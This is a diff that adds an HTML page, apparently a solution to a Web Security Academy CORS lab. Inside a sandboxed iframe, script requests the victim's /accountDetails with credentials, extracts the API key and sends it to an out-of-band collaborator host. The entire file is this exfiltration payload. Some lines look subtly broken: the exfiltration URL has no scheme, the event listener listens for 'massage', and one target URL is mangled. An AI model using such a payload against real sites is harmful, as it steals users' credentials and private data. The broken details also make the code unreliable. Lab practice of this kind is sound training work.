@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <iframe id="my" sandbox="allow-scripts" srcdoc="
+      &lt;script&gt;
+        var xhttp = new XMLHttpRequest();
+        xhttp.onreadystatechange = function() {
+          if (this.readyState == 4 &amp;&amp; this.status == 200) {
+            var apikey = JSON.parse(this.responseText).apikey;
+            var exf = new XMLHttpRequest();
+
+            exf.open('GET', 'd0bk7t7z1wg00008ktf0gof3u7eyyyyyb.oast.pro' + encodeURIComponent(apikey), true);
+            exf.send();
+          }
+        };
+        xhttp.open('GET', 'https://0a180075031dbfd280600364005e008e.web-security-academy.net/accountDetails', true);
+        xhttp.withCredentials = true;
+        xhttp.send();
+      &lt;/script&gt;
+    "></iframe>
+    <script>
+    const iframe = document.getElementById('my');
+    window.addEventListener('massage',
+    (e) => {
+      if (e.data === 'iframe-loaded')
+    {
+      iframe.src = 'https://mamd.com0a180075031dbfd280600364005e008e.web-security-academy.net/accountDetails';
+    }
+    });
+    </script>
+  </body>
+</html>
